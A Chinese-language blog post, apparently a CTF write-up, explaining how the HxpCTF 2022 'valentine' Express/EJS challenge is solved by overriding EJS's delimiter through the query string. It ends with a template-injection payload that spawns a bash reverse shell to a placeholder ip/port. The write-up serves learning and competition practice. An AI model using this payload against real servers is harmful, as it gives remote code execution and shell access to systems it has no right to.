@@ -1,0 +1,946 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='太菜了，哭哭 valentine 源码审计。一个简单的JS var express = require(&#39;express&#39;); var bodyParser = require(&#39;body-parser&#39;) const crypto = require(&amp;quot;crypto&amp;quot;); var path = require(&#39;path&#39;); const fs = require(&#39;fs&#39;); var app = express(); viewsFolder = path.join(__dirname, &#39;views&#39;); if (!fs.existsSync(viewsFolder)) { fs.mkdirSync(viewsFolder); } app.set(&#39;views&#39;, viewsFolder); app.set(&#39;view engine&#39;, &#39;ejs&#39;); app.use(bodyParser.urlencoded({ extended: false })) app.post(&#39;/template&#39;, function (req, res) { let tmpl = req.body.tmpl;'><title>HxpCTF2022-Web</title>
+
+<link rel='canonical' href='https://koali-www.github.io/2023/hxpctf2022-web/'>
+
+<link rel="stylesheet" href="/scss/style.min.9386c8bee911c8cc9f9c4df385b91100cfdaf1122a331583f740062d4eae78a6.css"><meta property='og:title' content='HxpCTF2022-Web'>
+<meta property='og:description' content='太菜了，哭哭 valentine 源码审计。一个简单的JS var express = require(&#39;express&#39;); var bodyParser = require(&#39;body-parser&#39;) const crypto = require(&amp;quot;crypto&amp;quot;); var path = require(&#39;path&#39;); const fs = require(&#39;fs&#39;); var app = express(); viewsFolder = path.join(__dirname, &#39;views&#39;); if (!fs.existsSync(viewsFolder)) { fs.mkdirSync(viewsFolder); } app.set(&#39;views&#39;, viewsFolder); app.set(&#39;view engine&#39;, &#39;ejs&#39;); app.use(bodyParser.urlencoded({ extended: false })) app.post(&#39;/template&#39;, function (req, res) { let tmpl = req.body.tmpl;'>
+<meta property='og:url' content='https://koali-www.github.io/2023/hxpctf2022-web/'>
+<meta property='og:site_name' content='k0a1i'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='web' /><meta property='article:tag' content='EJS' /><meta property='article:tag' content='express' /><meta property='article:published_time' content='2023-03-14T16:17:19&#43;08:00'/><meta property='article:modified_time' content='2023-03-14T21:23:33&#43;08:00'/>
+<meta name="twitter:title" content="HxpCTF2022-Web">
+<meta name="twitter:description" content="太菜了，哭哭 valentine 源码审计。一个简单的JS var express = require(&#39;express&#39;); var bodyParser = require(&#39;body-parser&#39;) const crypto = require(&amp;quot;crypto&amp;quot;); var path = require(&#39;path&#39;); const fs = require(&#39;fs&#39;); var app = express(); viewsFolder = path.join(__dirname, &#39;views&#39;); if (!fs.existsSync(viewsFolder)) { fs.mkdirSync(viewsFolder); } app.set(&#39;views&#39;, viewsFolder); app.set(&#39;view engine&#39;, &#39;ejs&#39;); app.use(bodyParser.urlencoded({ extended: false })) app.post(&#39;/template&#39;, function (req, res) { let tmpl = req.body.tmpl;"><style>
+    :root {
+        --article-font-family: "Noto Serif SC", var(--base-font-family);
+    }
+</style>
+
+<script> 
+		(function () {
+		    const customFont = document.createElement('link');
+		    customFont.href = "https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@300;700&display=swap"; 
+		    customFont.type = "text/css";
+		    customFont.rel = "stylesheet";
+		
+		    document.head.appendChild(customFont);
+		}());
+</script>
+
+    </head>
+    <body class="
+    article-page
+">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex 
+    <!-- 
+        extended
+     -->
+    on-phone--column extended
+">
+    
+<div id="article-toolbar">
+    <a href="https://koali-www.github.io/" class="back-home">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-chevron-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="15 6 9 12 15 18" />
+</svg>
+
+
+
+        <span>返回</span>
+    </a>
+</div>
+    <aside class="sidebar left-sidebar sticky">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header class="site-info">
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu84895f112c8e6c0fe80c5eecd5e543f0_258028_300x0_resize_q75_box.jpg" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">🍥</span>
+                
+            </figure>
+            
+        
+        
+        <h1 class="site-name"><a href="/">k0a1i</a></h1>
+        <h2 class="site-description">流水不争先,争的是滔滔不绝</h2></header>
+
+    <ol class="menu" id="main-menu">
+        
+        
+        
+
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>主页/Home</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/about/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>关于/About</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/links/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
+  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
+</svg>
+
+
+
+                
+                <span>链接/Links</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>归档/Archives</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>搜索/Search</span>
+            </a>
+        </li>
+        
+
+        
+            <li id="dark-mode-toggle">
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                <span>暗色模式</span>
+            </li>
+        
+    </ol>
+</aside>
+
+<main class="main full-width">
+    <article class="main-article">
+    <header class="article-header">
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/ctf/" style="background-color: #80aba9; color: #fff;">
+                CTF | 端茶送水web手
+            </a>
+        
+    </header>
+    
+
+    <h2 class="article-title">
+        <a href="/2023/hxpctf2022-web/">HxpCTF2022-Web</a>
+    </h2>
+
+    
+
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Mar 14, 2023</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-words">
+                    812字
+                </time>
+            </div>
+        
+    </footer>
+    
+</div>
+</header>
+
+    <section class="article-content">
+    
+    
+    <p>太菜了，哭哭</p>
+<h2 id="valentine">valentine</h2>
+<p>源码审计。一个简单的JS</p>
+<pre><code class="language-js">var express = require('express');
+var bodyParser = require('body-parser')
+const crypto = require(&quot;crypto&quot;);
+var path = require('path');
+const fs = require('fs');
+
+var app = express();
+viewsFolder = path.join(__dirname, 'views');
+
+if (!fs.existsSync(viewsFolder)) {
+  fs.mkdirSync(viewsFolder);
+}
+
+app.set('views', viewsFolder);
+app.set('view engine', 'ejs');
+
+app.use(bodyParser.urlencoded({ extended: false }))
+
+app.post('/template', function (req, res) {
+  let tmpl = req.body.tmpl;
+  let i = -1;
+  while ((i = tmpl.indexOf(&quot;&lt;%&quot;, i + 1)) &gt;= 0) {
+    if (tmpl.substring(i, i + 11) !== &quot;&lt;%= name %&gt;&quot;) {
+      res.status(400).send({ message: &quot;Only '&lt;%= name %&gt;' is allowed.&quot; });
+      return;
+    }
+  }
+  let uuid;
+  do {
+    uuid = crypto.randomUUID();
+  } while (fs.existsSync(`views/${uuid}.ejs`))
+
+  try {
+    fs.writeFileSync(`views/${uuid}.ejs`, tmpl);
+  } catch (err) {
+    res.status(500).send(&quot;Failed to write Valentine's card&quot;);
+    return;
+  }
+  let name = req.body.name ?? '';
+  return res.redirect(`/${uuid}?name=${name}`);
+});
+
+app.get('/:template', function (req, res) {
+  let query = req.query;
+  let template = req.params.template
+  if (!/^[0-9A-F]{8}-[0-9A-F]{4}-[4][0-9A-F]{3}-[89AB][0-9A-F]{3}-[0-9A-F]{12}$/i.test(template)) {
+    res.status(400).send(&quot;Not a valid card id&quot;)
+    return;
+  }
+  if (!fs.existsSync(`views/${template}.ejs`)) {
+    res.status(400).send('Valentine\'s card does not exist')
+    return;
+  }
+  if (!query['name']) {
+    query['name'] = ''
+  }
+
+  return res.render(template, query);
+});
+
+app.get('/', function (req, res) {
+  return res.sendFile('./index.html', { root: __dirname });
+});
+
+app.listen(process.env.PORT || 9999);
+</code></pre>
+<p>然后看一下package.json，发现express以及ejs的版本都是最新的没有洞耶</p>
+<pre><code class="language-json">{
+  &quot;name&quot;: &quot;valentine&quot;,
+  &quot;version&quot;: &quot;1.0.0&quot;,
+  &quot;description&quot;: &quot;Create a valentine's card for your loved one&quot;,
+  &quot;main&quot;: &quot;app.js&quot;,
+  &quot;author&quot;: &quot;sandr0&quot;,
+  &quot;license&quot;: &quot;MIT&quot;,
+  &quot;dependencies&quot;: {
+    &quot;ejs&quot;: &quot;^3.1.8&quot;,
+    &quot;express&quot;: &quot;^4.18.2&quot;
+  }
+}
+</code></pre>
+<p>源码审了半天发现没有什么可以钻的空子于是卡住了。</p>
+<p>传奇高表哥后来说多看看文档，于是在文档里面找到了这个：</p>
+<p><figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 208; 
+			flex-basis: 499px"
+	>
+	<a href="/2023/hxpctf2022-web/image-20230314162646969.png" data-size="1099x528">
+		<img src="/2023/hxpctf2022-web/image-20230314162646969.png"
+			width="1099"
+			height="528"
+			srcset="/2023/hxpctf2022-web/image-20230314162646969_hu821b7b623e27ff07586d53320b3df7d7_41686_480x0_resize_box_3.png 480w, /2023/hxpctf2022-web/image-20230314162646969_hu821b7b623e27ff07586d53320b3df7d7_41686_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			alt="image-20230314162646969">
+	</a>
+	
+	<figcaption>image-20230314162646969</figcaption>
+	
+</figure></p>
+<p>再结合<code>res.render(template, query)</code>这段代码，query可控，也就是说<code>delimiter</code>这个参数可以手动传，我们可以利用这个点绕过<code>&lt;%</code>的检测，用其他的字符代替<code>%</code></p>
+<p>测试的时候可以传入</p>
+<p><figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 518; 
+			flex-basis: 1244px"
+	>
+	<a href="/2023/hxpctf2022-web/image-20230314162855765.png" data-size="804x155">
+		<img src="/2023/hxpctf2022-web/image-20230314162855765.png"
+			width="804"
+			height="155"
+			srcset="/2023/hxpctf2022-web/image-20230314162855765_hu02ad4896d3ee688a9fa9dd0aca745ec0_4982_480x0_resize_box_3.png 480w, /2023/hxpctf2022-web/image-20230314162855765_hu02ad4896d3ee688a9fa9dd0aca745ec0_4982_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			alt="image-20230314162855765">
+	</a>
+	
+	<figcaption>image-20230314162855765</figcaption>
+	
+</figure></p>
+<p>之后跟随重定向，传入delimiter参数</p>
+<p><figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 797; 
+			flex-basis: 1912px"
+	>
+	<a href="/2023/hxpctf2022-web/image-20230314162936864.png" data-size="805x101">
+		<img src="/2023/hxpctf2022-web/image-20230314162936864.png"
+			width="805"
+			height="101"
+			srcset="/2023/hxpctf2022-web/image-20230314162936864_hue6b8713bfc6c2df552d71e43e656eb45_9985_480x0_resize_box_3.png 480w, /2023/hxpctf2022-web/image-20230314162936864_hue6b8713bfc6c2df552d71e43e656eb45_9985_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			alt="image-20230314162936864">
+	</a>
+	
+	<figcaption>image-20230314162936864</figcaption>
+	
+</figure></p>
+<p>本地可以在控制台看到成功打印出的<code>1</code>字样，证明命令执行成功。</p>
+<p>再来看一下EJS在传入delimiter地方的源码：</p>
+<p><figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 244; 
+			flex-basis: 586px"
+	>
+	<a href="/2023/hxpctf2022-web/image-20230314163642941.png" data-size="1555x636">
+		<img src="/2023/hxpctf2022-web/image-20230314163642941.png"
+			width="1555"
+			height="636"
+			srcset="/2023/hxpctf2022-web/image-20230314163642941_hu588cd98a84f38f99f68373bbdcacbea2_134925_480x0_resize_box_3.png 480w, /2023/hxpctf2022-web/image-20230314163642941_hu588cd98a84f38f99f68373bbdcacbea2_134925_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			alt="image-20230314163642941">
+	</a>
+	
+	<figcaption>image-20230314163642941</figcaption>
+	
+</figure></p>
+<p>发现传入的<code>@</code>直接覆盖了原始的<code>%</code></p>
+<p><figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 346; 
+			flex-basis: 831px"
+	>
+	<a href="/2023/hxpctf2022-web/image-20230314164515437.png" data-size="942x272">
+		<img src="/2023/hxpctf2022-web/image-20230314164515437.png"
+			width="942"
+			height="272"
+			srcset="/2023/hxpctf2022-web/image-20230314164515437_hub5abcfdfa0cd2a7d240263416ec2e9cb_39902_480x0_resize_box_3.png 480w, /2023/hxpctf2022-web/image-20230314164515437_hub5abcfdfa0cd2a7d240263416ec2e9cb_39902_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			alt="image-20230314164515437">
+	</a>
+	
+	<figcaption>image-20230314164515437</figcaption>
+	
+</figure></p>
+<p><figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 1280; 
+			flex-basis: 3072px"
+	>
+	<a href="/2023/hxpctf2022-web/image-20230314164517233.png" data-size="1101x86">
+		<img src="/2023/hxpctf2022-web/image-20230314164517233.png"
+			width="1101"
+			height="86"
+			srcset="/2023/hxpctf2022-web/image-20230314164517233_huc533864158991973508d1b0cc088a179_20251_480x0_resize_box_3.png 480w, /2023/hxpctf2022-web/image-20230314164517233_huc533864158991973508d1b0cc088a179_20251_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			alt="image-20230314164517233">
+	</a>
+	
+	<figcaption>image-20230314164517233</figcaption>
+	
+</figure></p>
+<p>所以我们更改后的EJS模板最终能够被执行。</p>
+<p>这里有个小坑，就是在本地测试的时候一般是开发环境，但题目以及docker给的都是生产环境，这里会有一个cache保存没保存的区别。生产环境内，在EJS渲染的模板页面首次被访问时会产生cache到服务器上，而生成模板点击提交时会直接重定向过去并附带name参数，此时再次传delimiter参数就没有用了（EJS很懒，只会帮你渲染一次捏）；但开发环境似乎没有这个顾虑。</p>
+<p>EXP如下</p>
+<pre><code class="language-exp">&lt;@- global.process.mainModule.constructor._load(`child_process`).execSync(`bash -c &quot;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&quot;`) @&gt;
+</code></pre>
+<h2 id="写在后面">写在后面</h2>
+<p>附上<a class="link" href="https://hxp.io/blog/"  target="_blank" rel="noopener"
+    >官方wp</a></p>
+<p>还有一道题看起来好麻烦，争取找时间复现一下2333</p>
+<p>不知道为什么，总觉得最近的比赛打起来好费劲，我快变成笨蛋了&hellip;</p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/tags/web/">web</a>
+        
+            <a href="/tags/ejs/">EJS</a>
+        
+            <a href="/tags/express/">express</a>
+        
+    </section>
+
+
+    <section class="article-lastmod">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+        <span>
+            最后更新于 Mar 14, 2023 21:23 CST
+        </span>
+    </section></footer>
+
+
+    
+</article>
+
+    <aside class="related-contents--wrapper">
+    
+    
+        <h2 class="section-title">相关文章</h2>
+        <div class="related-contents">
+            <div class="flex article-list--tile">
+                
+                    
+<article class="">
+    <a href="/2023/vnctf2023web/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">VNCTF2023-Web</h2>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="">
+    <a href="/2022/%E8%93%9D%E5%B8%BD%E6%9D%AF2022/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">蓝帽杯2022</h2>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="">
+    <a href="/2022/dasctfxsuctf-web-writeup/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">DASCTFxSUCTF-web-writeup</h2>
+        </div>
+    </a>
+</article>
+                
+            </div>
+        </div>
+    
+</aside>
+
+     
+    
+
+    <footer class="site-footer">
+
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+
+  <script>
+    (function (u, c) {
+      var d = document, t = 'script', o = d.createElement(t),
+        s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(e); }); }
+      s.parentNode.insertBefore(o, s);
+    })('//cdn.bootcss.com/pangu/3.3.0/pangu.min.js', function () {
+      pangu.spacingPage();
+    });
+  </script>
+
+  <section class="copyright">
+    &copy;
+    
+    2020 -
+    
+    2023 <a href="">k0a1i</a>·<i class="fas fa-bell"></i>
+    <a id="days">0</a>Days<br>
+    共叨叨了14865字的废话໒・ﻌ・७</br><span>
+      
+      <p>
+  </section>
+
+  <section class="powerby">
+    Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
+    Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener"
+        data-version="3.2.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a><br />
+    
+  </section>
+
+  <script>
+    var s1 = '2023-02-09';
+    s1 = new Date(s1.replace(/-/g, "/"));
+    s2 = new Date();
+    var days = s2.getTime() - s1.getTime();
+    var number_of_days = parseInt(days / (1000 * 60 * 60 * 24));
+    document.getElementById('days').innerHTML = number_of_days;
+  </script>
+
+</footer>
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.css"integrity="sha256-c0uckgykQ9v5k&#43;IqViZOZKc47Jn7KQil4/MP3ySA3F8="crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.css"integrity="sha256-SBLU4vv6CA6lHsZ1XyTdhyjJxCjPif/TRkjnsyGAGnE="crossorigin="anonymous"
+            >
+
+            </main>
+    
+    
+    
+    <aside class="sidebar right-sidebar sticky">
+        
+            <form action="/search/" class="search-form widget" >
+        <p>
+            <label>搜索</label>
+            <input name="keyword" required placeholder="输入关键词..." />
+        
+            <button title="搜索">
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+            </button>
+        </p>
+    </form>
+        
+            
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">目录</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ul>
+    <li><a href="#valentine">valentine</a></li>
+    <li><a href="#写在后面">写在后面</a></li>
+  </ul>
+</nav>
+        </div>
+    </section>
+
+        
+            <section class="widget categories">
+    <div class="widget-icon">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-infinity" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M9.828 9.172a4 4 0 1 0 0 5.656 a10 10 0 0 0 2.172 -2.828a10 10 0 0 1 2.172 -2.828 a4 4 0 1 1 0 5.656a10 10 0 0 1 -2.172 -2.828a10 10 0 0 0 -2.172 -2.828" />
+</svg>
+
+
+
+    </div>
+    <h2 class="widget-title section-title">分类</h2>
+    <div class="widget-categories--list">
+        <div class="widget">
+            <h3 class="widget-title"> </h3>
+            <div class="widget-body">
+                <div class="category-list">
+                    <div class="category-list-item"><a href="https://koali-www.github.io/categories/ctf/" class="category-list-link">ctf<span class="category-list-count">7</a>
+                        </span></div>
+                    <div class="category-list-item"><a href="https://koali-www.github.io/categories/unity/" class="category-list-link">unity<span class="category-list-count">1</a>
+                        </span></div>
+                </div>
+            </div>
+        </div>
+    </div>
+</section>
+        
+            <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-infinity" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M9.828 9.172a4 4 0 1 0 0 5.656 a10 10 0 0 0 2.172 -2.828a10 10 0 0 1 2.172 -2.828 a4 4 0 1 1 0 5.656a10 10 0 0 1 -2.172 -2.828a10 10 0 0 0 -2.172 -2.828" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">归档</h2>
+
+        
+        
+        
+        
+        
+        <div class="widget-archive--list">
+            <div class="archives-year">
+                    <a href="/archives/#2023">
+                        
+                            <span class="year">2023</span>
+                            <span class="count">5</span>
+                        
+                    </a> 
+                </div>
+            <div class="archives-year">
+                    <a href="/archives/#2022">
+                        
+                            <span class="year">2022</span>
+                            <span class="count">4</span>
+                        
+                    </a> 
+                </div>
+            
+        </div>
+    </section>
+        
+            <section class="widget tagCloud">
+    <div class="widget-icon">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-tag" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11 3L20 12a1.5 1.5 0 0 1 0 2L14 20a1.5 1.5 0 0 1 -2 0L3 11v-4a4 4 0 0 1 4 -4h4" />
+  <circle cx="9" cy="9" r="2" />
+</svg>
+
+
+
+    </div>
+    <h2 class="widget-title section-title">标签云</h2>
+
+    <div class="tagCloud-tags">
+        
+            <a href="/tags/web/" class="font_size_6">
+                web
+            </a>
+        
+            <a href="/tags/java/" class="font_size_2">
+                java
+            </a>
+        
+            <a href="/tags/ejs/" class="font_size_1">
+                EJS
+            </a>
+        
+            <a href="/tags/errordiary/" class="font_size_1">
+                ErrorDiary
+            </a>
+        
+            <a href="/tags/express/" class="font_size_1">
+                express
+            </a>
+        
+            <a href="/tags/fastjson/" class="font_size_1">
+                fastjson
+            </a>
+        
+            <a href="/tags/go/" class="font_size_1">
+                Go
+            </a>
+        
+            <a href="/tags/hugo/" class="font_size_1">
+                Hugo
+            </a>
+        
